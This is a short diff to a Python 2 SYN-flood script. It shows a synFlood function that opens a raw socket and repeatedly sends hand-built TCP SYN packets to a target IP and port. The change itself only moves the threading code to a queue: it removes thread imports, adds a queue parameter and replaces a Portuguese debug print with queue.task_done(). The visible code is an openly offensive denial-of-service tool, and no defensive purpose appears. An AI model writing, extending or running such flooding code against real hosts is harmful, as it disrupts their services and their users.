@@ -1,6 +1,4 @@
 import sys
-import thread
-import threading
 import socket
 import random
 import struct
@@ -17,7 +15,7 @@ def calcChecksum(header):
     
     return checksum
 
-def synFlood(ID, portDest, ipDest, event):
+def synFlood(ID, portDest, ipDest, event, queue):
     while event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
@@ -67,5 +65,5 @@ def synFlood(ID, portDest, ipDest, event):
         
         packet = ipv4Header + tcpHeader;
         s.sendto(packet, (ipDest, 0))
-    print "MATOOOU A THREAD %s" % (ID)
+    queue.task_done()
 
